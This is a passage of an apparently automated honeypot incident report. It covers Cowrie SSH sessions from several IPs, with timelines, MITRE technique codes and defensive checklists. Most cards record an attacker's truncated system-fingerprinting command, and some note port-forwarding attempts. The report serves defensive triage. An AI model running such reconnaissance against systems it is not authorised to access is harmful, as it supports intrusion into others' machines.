| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:19:51` | `cowrie.session.connect` |
| `2026-07-12 17:19:52` | `cowrie.client.version` |
| `2026-07-12 17:19:52` | `cowrie.client.kex` |
| `2026-07-12 17:19:56` | `cowrie.login.success` |
| `2026-07-12 17:19:57` | `cowrie.session.params` |
| `2026-07-12 17:19:57` | `cowrie.command.input` |
| `2026-07-12 17:19:57` | `cowrie.command.input` |
| `2026-07-12 17:19:57` | `cowrie.command.input` |
| `2026-07-12 17:19:57` | `cowrie.command.input` |
| `2026-07-12 17:19:57` | `cowrie.command.input` |
| `2026-07-12 17:19:57` | `cowrie.command.success` |
| `2026-07-12 17:19:57` | `cowrie.command.input` |
| `2026-07-12 17:19:57` | `cowrie.command.input` |
| `2026-07-12 17:19:57` | `cowrie.command.input` |
| `2026-07-12 17:19:57` | `cowrie.command.input` |
| `2026-07-12 17:19:57` | `cowrie.log.closed` |
| `2026-07-12 17:19:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dcff6080bcf

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:19 |
| **Last Seen** | 2026-07-12 17:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:19:58` | `cowrie.session.connect` |
| `2026-07-12 17:19:59` | `cowrie.client.version` |
| `2026-07-12 17:19:59` | `cowrie.client.kex` |
| `2026-07-12 17:20:01` | `cowrie.login.success` |
| `2026-07-12 17:20:02` | `cowrie.session.params` |
| `2026-07-12 17:20:02` | `cowrie.command.input` |
| `2026-07-12 17:20:02` | `cowrie.command.input` |
| `2026-07-12 17:20:02` | `cowrie.command.input` |
| `2026-07-12 17:20:02` | `cowrie.command.input` |
| `2026-07-12 17:20:02` | `cowrie.command.input` |
| `2026-07-12 17:20:02` | `cowrie.command.success` |
| `2026-07-12 17:20:02` | `cowrie.command.input` |
| `2026-07-12 17:20:02` | `cowrie.command.input` |
| `2026-07-12 17:20:02` | `cowrie.command.input` |
| `2026-07-12 17:20:02` | `cowrie.command.input` |
| `2026-07-12 17:20:03` | `cowrie.log.closed` |
| `2026-07-12 17:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44df954bcb5f

| Field | Detail |
|---|---|
| **Source IP** | `50.187.155[.]130` |
| **First Seen** | 2026-07-12 17:21 |
| **Last Seen** | 2026-07-12 17:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:21:01` | `cowrie.session.connect` |
| `2026-07-12 17:21:02` | `cowrie.client.version` |
| `2026-07-12 17:21:02` | `cowrie.client.kex` |
| `2026-07-12 17:21:03` | `cowrie.login.success` |
| `2026-07-12 17:21:03` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.187.155[.]130` to AbuseIPDB if not already reported
- [ ] Block `50.187.155[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be3865f0f050

| Field | Detail |
|---|---|
| **Source IP** | `196.219.93[.]108` |
| **First Seen** | 2026-07-12 17:21 |
| **Last Seen** | 2026-07-12 17:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:21:08` | `cowrie.session.connect` |
| `2026-07-12 17:21:09` | `cowrie.client.version` |
| `2026-07-12 17:21:09` | `cowrie.client.kex` |
| `2026-07-12 17:21:10` | `cowrie.login.success` |
| `2026-07-12 17:21:10` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.93[.]108` to AbuseIPDB if not already reported
- [ ] Block `196.219.93[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4196e9fc8842

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:21 |
| **Last Seen** | 2026-07-12 17:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:21:55` | `cowrie.session.connect` |
| `2026-07-12 17:21:55` | `cowrie.client.version` |
| `2026-07-12 17:21:55` | `cowrie.client.kex` |
| `2026-07-12 17:21:56` | `cowrie.login.success` |
| `2026-07-12 17:21:57` | `cowrie.session.params` |
| `2026-07-12 17:21:57` | `cowrie.command.input` |
| `2026-07-12 17:21:57` | `cowrie.command.input` |
| `2026-07-12 17:21:57` | `cowrie.command.input` |
| `2026-07-12 17:21:57` | `cowrie.command.input` |
| `2026-07-12 17:21:57` | `cowrie.command.input` |
| `2026-07-12 17:21:57` | `cowrie.command.success` |
| `2026-07-12 17:21:57` | `cowrie.command.input` |
| `2026-07-12 17:21:57` | `cowrie.command.input` |
| `2026-07-12 17:21:57` | `cowrie.command.input` |
| `2026-07-12 17:21:57` | `cowrie.command.input` |
| `2026-07-12 17:21:58` | `cowrie.log.closed` |
| `2026-07-12 17:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce2468851ddc

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:21 |
| **Last Seen** | 2026-07-12 17:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:21:58` | `cowrie.session.connect` |
| `2026-07-12 17:21:58` | `cowrie.client.version` |
| `2026-07-12 17:21:58` | `cowrie.client.kex` |
| `2026-07-12 17:22:00` | `cowrie.login.success` |
| `2026-07-12 17:22:01` | `cowrie.session.params` |
| `2026-07-12 17:22:01` | `cowrie.command.input` |
| `2026-07-12 17:22:01` | `cowrie.command.input` |
| `2026-07-12 17:22:01` | `cowrie.command.input` |
| `2026-07-12 17:22:01` | `cowrie.command.input` |
| `2026-07-12 17:22:01` | `cowrie.command.input` |
| `2026-07-12 17:22:01` | `cowrie.command.success` |
| `2026-07-12 17:22:01` | `cowrie.command.input` |
| `2026-07-12 17:22:01` | `cowrie.command.input` |
| `2026-07-12 17:22:01` | `cowrie.command.input` |
| `2026-07-12 17:22:01` | `cowrie.command.input` |
| `2026-07-12 17:22:02` | `cowrie.log.closed` |
| `2026-07-12 17:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf16a07b464

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:21 |
| **Last Seen** | 2026-07-12 17:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:21:59` | `cowrie.session.connect` |
| `2026-07-12 17:22:01` | `cowrie.client.version` |
| `2026-07-12 17:22:01` | `cowrie.client.kex` |
| `2026-07-12 17:22:04` | `cowrie.login.success` |
| `2026-07-12 17:22:05` | `cowrie.session.params` |
| `2026-07-12 17:22:05` | `cowrie.command.input` |
| `2026-07-12 17:22:05` | `cowrie.command.input` |
| `2026-07-12 17:22:05` | `cowrie.command.input` |
| `2026-07-12 17:22:05` | `cowrie.command.input` |
| `2026-07-12 17:22:05` | `cowrie.command.input` |
| `2026-07-12 17:22:05` | `cowrie.command.success` |
| `2026-07-12 17:22:05` | `cowrie.command.input` |
| `2026-07-12 17:22:05` | `cowrie.command.input` |
| `2026-07-12 17:22:05` | `cowrie.command.input` |
| `2026-07-12 17:22:05` | `cowrie.command.input` |
| `2026-07-12 17:22:05` | `cowrie.log.closed` |
| `2026-07-12 17:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f74a73ee74b2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:23 |
| **Last Seen** | 2026-07-12 17:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:23:58` | `cowrie.session.connect` |
| `2026-07-12 17:23:58` | `cowrie.client.version` |
| `2026-07-12 17:23:58` | `cowrie.client.kex` |
| `2026-07-12 17:24:00` | `cowrie.login.success` |
| `2026-07-12 17:24:02` | `cowrie.session.params` |
| `2026-07-12 17:24:02` | `cowrie.command.input` |
| `2026-07-12 17:24:02` | `cowrie.command.input` |
| `2026-07-12 17:24:02` | `cowrie.command.input` |
| `2026-07-12 17:24:02` | `cowrie.command.input` |
| `2026-07-12 17:24:02` | `cowrie.command.input` |
| `2026-07-12 17:24:02` | `cowrie.command.success` |
| `2026-07-12 17:24:02` | `cowrie.command.input` |
| `2026-07-12 17:24:02` | `cowrie.command.input` |
| `2026-07-12 17:24:02` | `cowrie.command.input` |
| `2026-07-12 17:24:02` | `cowrie.command.input` |
| `2026-07-12 17:24:03` | `cowrie.log.closed` |
| `2026-07-12 17:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e61f249e7cca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:24 |
| **Last Seen** | 2026-07-12 17:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:24:05` | `cowrie.session.connect` |
| `2026-07-12 17:24:05` | `cowrie.client.version` |
| `2026-07-12 17:24:05` | `cowrie.client.kex` |
| `2026-07-12 17:24:07` | `cowrie.login.success` |
| `2026-07-12 17:24:08` | `cowrie.session.params` |
| `2026-07-12 17:24:08` | `cowrie.command.input` |
| `2026-07-12 17:24:08` | `cowrie.command.input` |
| `2026-07-12 17:24:08` | `cowrie.command.input` |
| `2026-07-12 17:24:08` | `cowrie.command.input` |
| `2026-07-12 17:24:08` | `cowrie.command.input` |
| `2026-07-12 17:24:08` | `cowrie.command.success` |
| `2026-07-12 17:24:08` | `cowrie.command.input` |
| `2026-07-12 17:24:08` | `cowrie.command.input` |
| `2026-07-12 17:24:08` | `cowrie.command.input` |
| `2026-07-12 17:24:08` | `cowrie.command.input` |
| `2026-07-12 17:24:08` | `cowrie.log.closed` |
| `2026-07-12 17:24:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63f212a0a5ad

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:24 |
| **Last Seen** | 2026-07-12 17:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:24:05` | `cowrie.session.connect` |
| `2026-07-12 17:24:07` | `cowrie.client.version` |
| `2026-07-12 17:24:07` | `cowrie.client.kex` |
| `2026-07-12 17:24:10` | `cowrie.login.success` |
| `2026-07-12 17:24:11` | `cowrie.session.params` |
| `2026-07-12 17:24:11` | `cowrie.command.input` |
| `2026-07-12 17:24:11` | `cowrie.command.input` |
| `2026-07-12 17:24:11` | `cowrie.command.input` |
| `2026-07-12 17:24:11` | `cowrie.command.input` |
| `2026-07-12 17:24:11` | `cowrie.command.input` |
| `2026-07-12 17:24:11` | `cowrie.command.success` |
| `2026-07-12 17:24:11` | `cowrie.command.input` |
| `2026-07-12 17:24:11` | `cowrie.command.input` |
| `2026-07-12 17:24:11` | `cowrie.command.input` |
| `2026-07-12 17:24:11` | `cowrie.command.input` |
| `2026-07-12 17:24:12` | `cowrie.log.closed` |
| `2026-07-12 17:24:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-087a85eea68a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:25 |
| **Last Seen** | 2026-07-12 17:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:25:56` | `cowrie.session.connect` |
| `2026-07-12 17:25:57` | `cowrie.client.version` |
| `2026-07-12 17:25:57` | `cowrie.client.kex` |
| `2026-07-12 17:25:58` | `cowrie.login.success` |
| `2026-07-12 17:26:00` | `cowrie.session.params` |
| `2026-07-12 17:26:00` | `cowrie.command.input` |
| `2026-07-12 17:26:00` | `cowrie.command.input` |
| `2026-07-12 17:26:00` | `cowrie.command.input` |
| `2026-07-12 17:26:00` | `cowrie.command.input` |
| `2026-07-12 17:26:00` | `cowrie.command.input` |
| `2026-07-12 17:26:00` | `cowrie.command.success` |
| `2026-07-12 17:26:00` | `cowrie.command.input` |
| `2026-07-12 17:26:00` | `cowrie.command.input` |
| `2026-07-12 17:26:00` | `cowrie.command.input` |
| `2026-07-12 17:26:00` | `cowrie.command.input` |
| `2026-07-12 17:26:01` | `cowrie.log.closed` |
| `2026-07-12 17:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18cff0f833aa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:26 |
| **Last Seen** | 2026-07-12 17:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:26:13` | `cowrie.session.connect` |
| `2026-07-12 17:26:14` | `cowrie.client.version` |
| `2026-07-12 17:26:14` | `cowrie.client.kex` |
| `2026-07-12 17:26:18` | `cowrie.login.success` |
| `2026-07-12 17:26:19` | `cowrie.session.params` |
| `2026-07-12 17:26:19` | `cowrie.command.input` |
| `2026-07-12 17:26:19` | `cowrie.command.input` |
| `2026-07-12 17:26:19` | `cowrie.command.input` |
| `2026-07-12 17:26:19` | `cowrie.command.input` |
| `2026-07-12 17:26:19` | `cowrie.command.input` |
| `2026-07-12 17:26:19` | `cowrie.command.success` |
| `2026-07-12 17:26:19` | `cowrie.command.input` |
| `2026-07-12 17:26:19` | `cowrie.command.input` |
| `2026-07-12 17:26:19` | `cowrie.command.input` |
| `2026-07-12 17:26:19` | `cowrie.command.input` |
| `2026-07-12 17:26:20` | `cowrie.log.closed` |
| `2026-07-12 17:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f73290003e53

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:26 |
| **Last Seen** | 2026-07-12 17:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:26:15` | `cowrie.session.connect` |
| `2026-07-12 17:26:16` | `cowrie.client.version` |
| `2026-07-12 17:26:16` | `cowrie.client.kex` |
| `2026-07-12 17:26:16` | `cowrie.login.success` |
| `2026-07-12 17:26:18` | `cowrie.session.params` |
| `2026-07-12 17:26:18` | `cowrie.command.input` |
| `2026-07-12 17:26:18` | `cowrie.command.input` |
| `2026-07-12 17:26:18` | `cowrie.command.input` |
| `2026-07-12 17:26:18` | `cowrie.command.input` |
| `2026-07-12 17:26:18` | `cowrie.command.input` |
| `2026-07-12 17:26:18` | `cowrie.command.success` |
| `2026-07-12 17:26:18` | `cowrie.command.input` |
| `2026-07-12 17:26:18` | `cowrie.command.input` |
| `2026-07-12 17:26:18` | `cowrie.command.input` |
| `2026-07-12 17:26:18` | `cowrie.command.input` |
| `2026-07-12 17:26:18` | `cowrie.log.closed` |
| `2026-07-12 17:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-666873d0c8c8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:27 |
| **Last Seen** | 2026-07-12 17:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
